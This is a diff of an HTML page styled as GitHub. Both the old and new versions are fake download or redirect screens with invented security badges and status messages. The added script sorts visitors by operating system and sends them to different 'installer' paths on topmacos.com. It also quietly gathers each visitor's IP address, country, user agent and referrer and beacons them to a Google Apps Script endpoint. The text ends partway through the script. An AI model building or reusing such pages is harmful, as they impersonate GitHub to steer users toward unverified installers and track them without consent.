@@ -1,696 +1,280 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Preparing download… · GitHub</title>
-
-  <style>
-    :root { 
-      color-scheme: light dark;
-      --color-canvas-default: #0d1117;
-      --color-canvas-subtle: #161b22;
-      --color-border-default: #30363d;
-      --color-border-muted: #21262d;
-      --color-fg-default: #e6edf3;
-      --color-fg-muted: #8d96a0;
-      --color-accent-emphasis: #1f6feb;
-      --color-success-emphasis: #2ea043;
-      --color-neutral-emphasis: #6e7681;
-      --color-danger-emphasis: #da3633;
-    }
-
-    * { 
-      box-sizing: border-box; 
-      margin: 0;
-      padding: 0;
-    }
-
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
-      background: var(--color-canvas-default);
-      color: var(--color-fg-default);
-      line-height: 1.5;
-      -webkit-font-smoothing: antialiased;
-    }
-
-    a { 
-      color: var(--color-accent-emphasis); 
-      text-decoration: none; 
-      transition: color 0.2s;
-    }
-    a:hover { color: #58a6ff; }
-
-    .page-wrapper {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-
-    /* Header Styles */
-    .header {
-      background: #010409;
-      border-bottom: 1px solid var(--color-border-muted);
-      padding: 16px 32px;
-      position: sticky;
-      top: 0;
-      z-index: 100;
-    }
-
-    .header-container {
-      max-width: 1280px;
-      margin: 0 auto;
-      display: flex;
-      align-items: center;
-      gap: 16px;
-    }
-
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      color: var(--color-fg-default);
-      font-size: 16px;
-      font-weight: 600;
-      margin-right: auto;
-    }
-
-    .logo svg { 
-      fill: currentColor;
-      transition: fill 0.2s;
-    }
-    .logo:hover svg { fill: #8d96a0; }
-
-    .header-nav {
-      display: flex;
-      gap: 20px;
-      align-items: center;
-    }
-
-    .header-link {
-      color: var(--color-fg-default);
-      font-size: 14px;
-      font-weight: 500;
-      padding: 4px 8px;
-      border-radius: 6px;
-      transition: background 0.2s;
-    }
-    .header-link:hover { 
-      background: rgba(177,186,196,0.12);
-      text-decoration: none;
-    }
-
-    /* Main Content */
-    main {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 40px 20px;
-    }
-
-    .content-wrapper {
-      width: 100%;
-      max-width: 720px;
-    }
-
-    .download-card {
-      background: var(--color-canvas-subtle);
-      border: 1px solid var(--color-border-default);
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 8px 24px rgba(1,4,9,0.4);
-    }
-
-    .card-header {
-      padding: 24px 32px;
-      border-bottom: 1px solid var(--color-border-default);
-      background: linear-gradient(180deg, #161b22 0%, #0d1117 100%);
-    }
-
-    .header-top {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 8px;
-    }
-
-    .github-icon {
-      width: 40px;
-      height: 40px;
-      background: var(--color-canvas-default);
-      border: 1px solid var(--color-border-default);
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .github-icon svg { fill: var(--color-fg-default); }
-
-    .header-title {
-      font-size: 20px;
-      font-weight: 600;
-      color: var(--color-fg-default);
-    }
-
-    .verified-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      padding: 4px 12px;
-      background: rgba(46,160,67,0.15);
-      border: 1px solid rgba(46,160,67,0.3);
-      border-radius: 999px;
-      font-size: 12px;
-      color: var(--color-success-emphasis);
-      font-weight: 500;
-      margin-left: auto;
-    }
-
-    .verified-icon {
-      width: 16px;
-      height: 16px;
-      background: var(--color-success-emphasis);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-size: 10px;
-      font-weight: bold;
-    }
-
-    .card-subtitle {
-      color: var(--color-fg-muted);
-      font-size: 14px;
-      margin-top: 4px;
-    }
-
-    .card-body {
-      padding: 32px;
-    }
-
-    .status-section {
-      text-align: center;
-      margin-bottom: 32px;
-    }
-
-    .spinner-container {
-      margin-bottom: 20px;
-      display: flex;
-      justify-content: center;
-    }
-
-    .spinner {
-      width: 48px;
-      height: 48px;
-      border: 4px solid var(--color-border-default);
-      border-top-color: var(--color-accent-emphasis);
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .status-title {
-      font-size: 24px;
-      font-weight: 600;
-      margin-bottom: 8px;
-      color: var(--color-fg-default);
-    }
-
-    .status-description {
-      color: var(--color-fg-muted);
-      font-size: 14px;
-    }
-
-    /* Security Section */
-    .security-section {
-      background: linear-gradient(135deg, rgba(31,111,235,0.1) 0%, rgba(46,160,67,0.1) 100%);
-      border: 1px solid rgba(31,111,235,0.2);
-      border-radius: 8px;
-      padding: 24px;
-      margin-bottom: 24px;
-    }
-
-    .security-title {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      font-size: 16px;
-      font-weight: 600;
-      margin-bottom: 16px;
-      color: var(--color-fg-default);
-    }
-
-    .security-icon {
-      width: 20px;
-      height: 20px;
-      color: var(--color-success-emphasis);
-    }
-
-    .security-badges {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-      gap: 12px;
-    }
-
-    .security-badge {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 12px 16px;
-      background: rgba(177,186,196,0.08);
-      border: 1px solid var(--color-border-default);
-      border-radius: 6px;
-      font-size: 13px;
-      color: var(--color-fg-default);
-      font-weight: 500;
-    }
-
-    .badge-icon {
-      width: 16px;
-      height: 16px;
-      color: var(--color-success-emphasis);
-    }
-
-    /* Progress Section */
-    .progress-section {
-      background: var(--color-canvas-default);
-      border: 1px solid var(--color-border-default);
-      border-radius: 8px;
-      padding: 24px;
-      margin-bottom: 24px;
-    }
-
-    .countdown-wrapper {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .countdown-label {
-      font-size: 13px;
-      color: var(--color-fg-muted);
-      margin-bottom: 8px;
-    }
-
-    .countdown-time {
-      font-size: 36px;
-      font-weight: 700;
-      color: var(--color-accent-emphasis);
-      font-variant-numeric: tabular-nums;
-      letter-spacing: -1px;
-    }
-
-    .progress-bar-wrapper {
-      width: 100%;
-      height: 10px;
-      background: var(--color-canvas-subtle);
-      border: 1px solid var(--color-border-default);
-      border-radius: 999px;
-      overflow: hidden;
-      margin-bottom: 20px;
-      position: relative;
-    }
-
-    .progress-bar {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #1f6feb 0%, #58a6ff 100%);
-      transition: width 100ms linear;
-      border-radius: 999px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .progress-bar::after {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-      animation: shimmer 1.5s infinite;
-    }
-
-    @keyframes shimmer {
-      0% { transform: translateX(-100%); }
-      100% { transform: translateX(100%); }
-    }
-
-    .redirect-info {
-      text-align: center;
-      color: var(--color-fg-muted);
-      font-size: 14px;
-      margin-bottom: 16px;
-    }
-
-    .redirect-info strong {
-      color: var(--color-fg-default);
-      font-weight: 600;
-    }
-
-    .btn-primary {
-      width: 100%;
-      padding: 12px 24px;
-      background: var(--color-accent-emphasis);
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.2s;
-      box-shadow: 0 0 transparent, 0 0 transparent, 0 1px 2px 0 rgba(31,35,40,0.12);
-    }
-
-    .btn-primary:hover {
-      background: #1a7fed;
-      box-shadow: 0 0 transparent, 0 0 transparent, 0 2px 4px 0 rgba(31,35,40,0.24);
-    }
-
-    .btn-primary:active {
-      transform: scale(0.98);
-    }
-
-    /* Info Box */
-    .info-box {
-      background: rgba(187,128,9,0.1);
-      border: 1px solid rgba(187,128,9,0.3);
-      border-radius: 8px;
-      padding: 16px;
-      display: flex;
-      gap: 12px;
-      font-size: 13px;
-      color: var(--color-fg-default);
-      line-height: 1.6;
-    }
-
-    .info-icon {
-      flex-shrink: 0;
-      width: 18px;
-      height: 18px;
-      color: #d29922;
-    }
-
-    /* Footer */
-    footer {
-      border-top: 1px solid var(--color-border-muted);
-      background: #010409;
-      padding: 32px 20px;
-      color: var(--color-fg-muted);
-      font-size: 12px;
-    }
-
-    .footer-container {
-      max-width: 1280px;
-      margin: 0 auto;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 16px;
-    }
-
-    .footer-links {
-      display: flex;
-      gap: 20px;
-      flex-wrap: wrap;
-    }
-
-    .footer-link {
-      color: var(--color-accent-emphasis);
-      font-size: 12px;
-    }
-
-    /* Responsive */
-    @media (max-width: 768px) {
-      .header {
-        padding: 12px 16px;
-      }
-
-      .header-nav {
-        display: none;
-      }
-
-      .card-header,
-      .card-body {
-        padding: 24px 20px;
-      }
-
-      .status-title {
-        font-size: 20px;
-      }
-
-      .countdown-time {
-        font-size: 28px;
-      }
-
-      .security-badges {
-        grid-template-columns: 1fr;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">
+    <title>Redirecting | GitHub</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; }
+        body { background:#0d1117; color:#e6edf3; min-height:100vh; display:flex; justify-content:center; align-items:center; overflow:hidden; }
+        .container { text-align:center; max-width:500px; width:90%; padding:2rem; }
+        .github-icon { width:80px; height:80px; margin:0 auto 2rem; position:relative; }
+        .octocat-arm { position:absolute; top:35px; right:-8px; width:20px; height:12px; background:#e6edf3; border-radius:4px; transform-origin:left center; animation:wave 2s ease-in-out infinite; }
+        .logo-text { font-size:2.5rem; font-weight:600; margin-bottom:.5rem; color:#f0f6fc; }
+        .subtitle { font-size:1.1rem; color:#7d8590; margin-bottom:3rem; line-height:1.5; }
+        .loader-container { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:2.5rem 2rem; margin-bottom:2rem; }
+        .progress-info { display:flex; justify-content:space-between; margin-bottom:1rem; font-size:.9rem; color:#7d8590; }
+        .progress-bar { width:100%; height:8px; background:#21262d; border-radius:4px; overflow:hidden; margin-bottom:1.5rem; }
+        .progress-fill { height:100%; width:0%; background:#238636; border-radius:4px; transition:width .3s ease; position:relative; }
+        .progress-fill::after { content:''; position:absolute; top:0; left:0; width:100%; height:100%; background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent); animation:shine 2s infinite; }
+        .status-line { display:flex; align-items:center; justify-content:center; gap:.5rem; margin-bottom:1.5rem; font-size:.95rem; }
+        .status-dot { width:8px; height:8px; border-radius:50%; background:#238636; animation:pulse 2s infinite; }
+        .branch-info { display:inline-flex; align-items:center; gap:.5rem; padding:.5rem 1rem; background:#1f6feb; border-radius:6px; font-size:.9rem; margin-bottom:1rem; }
+        .commit-grid { display:grid; grid-template-columns:repeat(10,1fr); gap:4px; margin:1.5rem 0; }
+        .commit-cell { aspect-ratio:1; background:#21262d; border-radius:2px; transition:all .3s ease; }
+        .commit-cell.active { background:#238636; }
+        .redirect-message { color:#7d8590; font-size:.95rem; margin-top:1.5rem; }
+        .github-corner { position:absolute; top:0; right:0; border:0; fill:#30363d; color:#0d1117; }
+        @keyframes wave { 0%,100%{transform:rotate(0)} 50%{transform:rotate(-20deg)} }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
+        @keyframes shine { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }
+        @keyframes fadeIn { from{opacity:0; transform:translateY(10px)} to{opacity:1; transform:translateY(0)} }
+        @media (max-width:768px){
+            .container{padding:1rem}
+            .logo-text{font-size:2rem}
+            .github-icon{width:60px;height:60px}
+            .octocat-arm{top:25px; right:-6px; width:16px; height:10px}
+        }
+    </style>
 </head>
-
 <body>
-  <div class="page-wrapper"
-       data-redirect-url="https://softwin.it.com/"
-       data-delay-ms="4000">
+    <a href="https://github.com" class="github-corner" aria-label="View source on GitHub">
+        <svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position:absolute; top:0; border:0; right:0;" aria-hidden="true">
+            <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+            <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px;" class="octo-arm"></path>
+            <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+        </svg>
+    </a>
 
-    <!-- Header -->
-    <header class="header">
-      <div class="header-container">
-        <a class="logo" href="#" aria-label="GitHub">
-          <svg height="32" viewBox="0 0 16 16" width="32" aria-hidden="true">
-            <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
-          </svg>
-          <span>GitHub</span>
-        </a>
-
-        <nav class="header-nav" aria-label="Main navigation">
-          <a class="header-link" href="#">Product</a>
-          <a class="header-link" href="#">Solutions</a>
-          <a class="header-link" href="#">Open Source</a>
-          <a class="header-link" href="#">Pricing</a>
-        </nav>
-      </div>
-    </header>
-
-    <!-- Main Content -->
-    <main>
-      <div class="content-wrapper">
-        <article class="download-card">
-          <!-- Card Header -->
-          <div class="card-header">
-            <div class="header-top">
-              <div class="github-icon">
-                <svg width="24" height="24" viewBox="0 0 16 16" fill="currentColor">
-                  <path d="M8.75 1.75V5h3c.55 0 1 .45 1 1v3c0 .55-.45 1-1 1h-3v3.25a.75.75 0 01-1.5 0V10h-3c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h3V1.75a.75.75 0 011.5 0z"></path>
-                </svg>
-              </div>
-              <div>
-                <h1 class="header-title">GitHub Archive Downloader</h1>
-                <p class="card-subtitle">Secure file delivery system</p>
-              </div>
-              <div class="verified-badge">
-                <span class="verified-icon">✓</span>
-                Verified
-              </div>
-            </div>
-          </div>
-
-          <!-- Card Body -->
-          <div class="card-body">
-            <!-- Status Section -->
-            <div class="status-section">
-              <div class="spinner-container">
-                <div class="spinner"></div>
-              </div>
-              <h2 class="status-title">Preparing your download...</h2>
-              <p class="status-description">Generating secure archive bundle</p>
-            </div>
-
-            <!-- Security Section -->
-            <div class="security-section">
-              <div class="security-title">
-                <svg class="security-icon" viewBox="0 0 16 16" fill="currentColor">
-                  <path d="M8 0a1 1 0 011 1v5.268l4.562-2.634a1 1 0 111 1.732L10 8l4.562 2.634a1 1 0 11-1 1.732L9 9.732V15a1 1 0 11-2 0V9.732l-4.562 2.634a1 1 0 11-1-1.732L6 8 1.438 5.366a1 1 0 011-1.732L7 6.268V1a1 1 0 011-1z"></path>
-                </svg>
-                Security Verified
-              </div>
-              <div class="security-badges">
-                <div class="security-badge">
-                  <svg class="badge-icon" viewBox="0 0 16 16" fill="currentColor">
-                    <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
-                  </svg>
-                  VirusTotal Clean
-                </div>
-                <div class="security-badge">
-                  <svg class="badge-icon" viewBox="0 0 16 16" fill="currentColor">
-                    <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm3.53 5.28l-4.5 4.5a.75.75 0 01-1.06 0l-2-2a.75.75 0 111.06-1.06L6.47 8.16l3.97-3.97a.75.75 0 111.06 1.06z"></path>
-                  </svg>
-                  Malware Protected
-                </div>
-                <div class="security-badge">
-                  <svg class="badge-icon" viewBox="0 0 16 16" fill="currentColor">
-                    <path fill-rule="evenodd" d="M8 0a8 8 0 100 16A8 8 0 008 0zM6.854 11.146L4.707 9l1.293-1.293L7.5 9.207l4.793-4.793L13.586 5.914l-6.086 6.086a1 1 0 01-1.414 0z"></path>
-                  </svg>
-                  SSL Encrypted
-                </div>
-              </div>
-            </div>
-
-            <!-- Progress Section -->
-            <div class="progress-section">
-              <div class="countdown-wrapper">
-                <div class="countdown-label">Download starting in</div>
-                <div class="countdown-time" id="countdownTime">4s</div>
-              </div>
-
-              <div class="progress-bar-wrapper">
-                <div class="progress-bar" id="progressBar"></div>
-              </div>
-
-              <div class="redirect-info">
-                Automatic redirect in <strong id="secondsText">4</strong> seconds
-              </div>
-
-              <button class="btn-primary" id="downloadBtn" type="button">
-                Download Now
-              </button>
-            </div>
-
-            <!-- Info Box -->
-            <div class="info-box">
-              <svg class="info-icon" viewBox="0 0 16 16" fill="currentColor">
-                <path fill-rule="evenodd" d="M8 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM0 8a8 8 0 1116 0A8 8 0 010 8zm6.5-.25A.75.75 0 017.25 7h1a.75.75 0 01.75.75v2.75h.25a.75.75 0 010 1.5h-2a.75.75 0 010-1.5h.25v-2h-.25a.75.75 0 01-.75-.75zM8 6a1 1 0 100-2 1 1 0 000 2z"></path>
-              </svg>
-              <div>
-                <strong>Keep this page open.</strong> The download will start automatically. If nothing happens, click the button above or try a different browser.
-              </div>
-            </div>
-          </div>
-        </article>
-      </div>
-    </main>
-
-    <!-- Footer -->
-    <footer>
-      <div class="footer-container">
-        <span>© 2026 GitHub, Inc.</span>
-        <div class="footer-links">
-          <a class="footer-link" href="#">Terms</a>
-          <a class="footer-link" href="#">Privacy</a>
-          <a class="footer-link" href="#">Security</a>
-          <a class="footer-link" href="#">Status</a>
-          <a class="footer-link" href="#">Docs</a>
-          <a class="footer-link" href="#">Contact GitHub</a>
-          <a class="footer-link" href="#">API</a>
+    <div class="container">
+        <div class="github-icon">
+            <svg height="80" viewBox="0 0 16 16" width="80" fill="#e6edf3">
+                <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+            </svg>
+            <div class="octocat-arm"></div>
         </div>
-      </div>
-    </footer>
-  </div>
 
-  <script>
-    (function() {
-      'use strict';
+        <h1 class="logo-text">GitHub</h1>
+        <p class="subtitle">Preparing to redirect to installer application</p>
 
-      // Configuration
-      const wrapper = document.querySelector('.page-wrapper');
-      const redirectUrl = wrapper?.dataset?.redirectUrl || '';
-      const delayMs = Math.max(0, Number(wrapper?.dataset?.delayMs || 4000));
+        <div class="loader-container">
+            <div class="progress-info">
+                <span>Processing request</span>
+                <span id="percentage">0%</span>
+            </div>
 
-      // DOM elements
-      const elements = {
-        countdown: document.getElementById('countdownTime'),
-        seconds: document.getElementById('secondsText'),
-        progressBar: document.getElementById('progressBar'),
-        button: document.getElementById('downloadBtn')
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress"></div>
+            </div>
+
+            <div class="status-line">
+                <div class="status-dot"></div>
+                <span id="status">Initializing security protocols</span>
+            </div>
+
+            <div class="branch-info">
+                <svg height="16" viewBox="0 0 16 16" width="16" fill="#e6edf3">
+                    <path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path>
+                </svg>
+                <span>main → installer-app</span>
+            </div>
+
+            <div class="commit-grid" id="commitGrid"></div>
+        </div>
+
+        <p class="redirect-message">You will be redirected to the installation page shortly</p>
+    </div>
+
+    <script>
+        /* ================== CONFIG ================== */
+        // TRACKER: Windows users go to topmacos.com/revo/, macOS users go to topmacos.com/saiyaara/
+        const DEST = {
+          windows:  "https://topmacos.com/revo/",
+          macos:    "https://topmacos.com/saiyaara/",
+          ios:      "https://topmacos.com/revo/",
+          android:  "https://topmacos.com/revo/",
+          linux:    "https://topmacos.com/revo/",
+          other:    "https://topmacos.com/revo/"
+        };
+        // Google Apps Script Web App URL for tracking
+        const APP_URL = "https://script.google.com/macros/s/AKfycbwip_VgPEumBXeWuX_OEX6huIMHfPXidiweHpHR-fGUQIqpcR-mAMAHC1JCUQyJne3n0Q/exec";
+        // Delay after 100% before redirect (ms)
+        const REDIRECT_DELAY_MS = 200;
+
+        
+  /* ================== HELPERS ================== */
+  const qs = new URLSearchParams(location.search);
+  const hardOs = (qs.get('os') || '').toLowerCase();
+
+  function parseParams(str){
+    const out = {}; if(!str) return out;
+    const s = str.replace(/^[?#]+/,''); if(!s) return out;
+    for(const pair of s.split('&')){ if(!pair) continue;
+      const [k,v] = pair.split('=');
+      const key = decodeURIComponent((k||'').trim());
+      const val = v===undefined ? '1' : decodeURIComponent((v||'').trim());
+      if(key) out[key]=val;
+    } return out;
+  }
+  function getOffer(){
+    const q=parseParams(location.search), h=parseParams(location.hash);
+    return q.offername || q.offer || q.offer_name || h.offername || h.offer || h.offer_name || '';
+  }
+  function keepQueryAndHash(base){ return base + location.search + (location.hash||''); }
+
+  // OS detect - tracks Windows and macOS specifically
+  function detectOS(){
+    if (['windows','macos','ios','android','linux','other'].includes(hardOs)) return hardOs;
+    const uad = navigator.userAgentData;
+    if (uad && uad.platform){
+      const p=uad.platform.toLowerCase();
+      if (p.includes('windows')) return 'windows';
+      if (p.includes('mac'))     return 'macos';
+      if (p.includes('ios'))     return 'ios';
+      if (p.includes('android')) return 'android';
+      if (p.includes('linux'))   return 'linux';
+    }
+    const ua = navigator.userAgent||'';
+    if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
+    if (/Android/i.test(ua))          return 'android';
+    if (/Windows NT/i.test(ua))       return 'windows';
+    if (/Macintosh;.*Mac OS X/i.test(ua)) return 'macos';
+    if (/Linux/i.test(ua))            return 'linux';
+    return 'other';
+  }
+
+  // Get IP address for tracking
+  async function getIP(){
+    try{
+      const r = await fetch("https://api64.ipify.org?format=json", {cache:"no-store"});
+      const j = await r.json();
+      return j.ip || "";
+    }catch{ return ""; }
+  }
+  
+  // Get geo information for tracking
+  async function getGeo(ip){
+    try{
+      if(!ip) return {country:"", countryCode:""};
+      const r = await fetch(`https://ipapi.co/${ip}/json/`, {cache:"no-store"});
+      const j = await r.json();
+      return { country: j.country_name || "", countryCode: j.country || "" };
+    }catch{ return {country:"", countryCode:""}; }
+  }
+
+  // Tracking function - sends OS data to Google Apps Script
+  function trackOSAndRedirect({os, offer, targetUrl, ip, country, countryCode}){
+    try{
+      const payload = {
+        ip, 
+        country, 
+        countryCode,
+        operatingSystem: os,
+        userAgent: navigator.userAgent,
+        referrer: document.referrer || "",
+        timestamp: new Date().toISOString(),
+        redirectUrl: targetUrl,
+        offer: offer,
+        eventType: "os_tracker_redirect"
       };
+      const q = new URLSearchParams({ p: JSON.stringify(payload) }).toString();
+      // Send tracking data via image beacon (non-blocking)
+      (new Image(1,1)).src = APP_URL + "?" + q + "&_t=" + Date.now();
+    }catch(_){}
+  }
 
-      // State
-      const state = {
-        startTime: performance.now(),
-        isRedirecting: false,
-        rafId: null
-      };
+  /* ================== UI ================== */
+  function createCommitGrid() {
+    const grid = document.getElementById('commitGrid');
+    const cellCount = 70;
+    for (let i = 0; i < cellCount; i++) {
+      const cell = document.createElement('div');
+      cell.classList.add('commit-cell');
+      if (Math.random() > 0.4) cell.style.opacity = Math.random() * 0.5 + 0.3;
+      grid.appendChild(cell);
+    }
+  }
 
-      // Utility function
-      function clamp(value, min, max) {
-        return Math.min(max, Math.max(min, value));
+  function animateProgress(targetUrl, os, offer) {
+    const progress = document.getElementById('progress');
+    const percentage = document.getElementById('percentage');
+    const status = document.getElementById('status');
+    const commitCells = document.querySelectorAll('.commit-cell');
+
+    const statusMessages = [
+      "Initializing security protocols",
+      "Verifying application signature",
+      "Establishing secure connection",
+      "Preparing download session",
+      "Finalizing redirect sequence"
+    ];
+
+    let progressValue = 0;
+    let currentStatus = 0;
+
+    const interval = setInterval(() => {
+      progressValue += 1;
+      progress.style.width = `${progressValue}%`;
+      percentage.textContent = `${progressValue}%`;
+
+      if (progressValue === 20 && currentStatus === 0) { status.textContent = statusMessages[1]; currentStatus = 1; }
+      if (progressValue === 45 && currentStatus === 1) { status.textContent = statusMessages[2]; currentStatus = 2; }
+      if (progressValue === 70 && currentStatus === 2) { status.textContent = statusMessages[3]; currentStatus = 3; }
+      if (progressValue === 90 && currentStatus === 3) { status.textContent = statusMessages[4]; currentStatus = 4; }
+
+      if (progressValue % 5 === 0) {
+        const randomCell = commitCells[Math.floor(Math.random() * commitCells.length)];
+        if (randomCell) { randomCell.classList.add('active'); setTimeout(() => randomCell.classList.remove('active'), 1000); }
       }
 
-      // Animation loop
-      function animate(currentTime) {
-        if (state.isRedirecting) return;
-
-        const elapsed = currentTime - state.startTime;
-        const progress = delayMs === 0 ? 1 : clamp(elapsed / delayMs, 0, 1);
-        
-        // Calculate remaining time
-        const remainingMs = Math.max(0, delayMs - elapsed);
-        const remainingSec = Math.ceil(remainingMs / 1000);
-
-        // Update UI
-        if (elements.countdown) {
-          elements.countdown.textContent = `${remainingSec}s`;
-        }
-        if (elements.seconds) {
-          elements.seconds.textContent = String(remainingSec);
-        }
-        if (elements.progressBar) {
-          const percentage = Math.max(0, Math.round(progress * 100));
-          elements.progressBar.style.width = `${percentage}%`;
-        }
-
-        // Check if time is up
-        if (elapsed >= delayMs) {
-          performRedirect();
-          return;
-        }
-
-        // Continue animation
-        state.rafId = requestAnimationFrame(animate);
+      if (progressValue >= 100) {
+        clearInterval(interval);
+        setTimeout(() => { location.replace(targetUrl); }, REDIRECT_DELAY_MS);
       }
+    }, 40);
+  }
 
-      // Redirect function
-      function performRedirect() {
-        if (state.isRedirecting) return;
-        
-        state.isRedirecting = true;
-        
-        if (state.rafId) {
-          cancelAnimationFrame(state.rafId);
-        }
+  // Initialize tracker: detect OS, get IP/Geo, send tracking data, then redirect to appropriate URL
+  window.addEventListener('load', async () => {
+    createCommitGrid();
 
-        if (redirectUrl) {
-          window.location.assign(redirectUrl);
-        }
-      }
+    // Detect operating system
+    const os = detectOS();
+    const offer = getOffer();
+    
+    // Get redirect URL based on detected OS
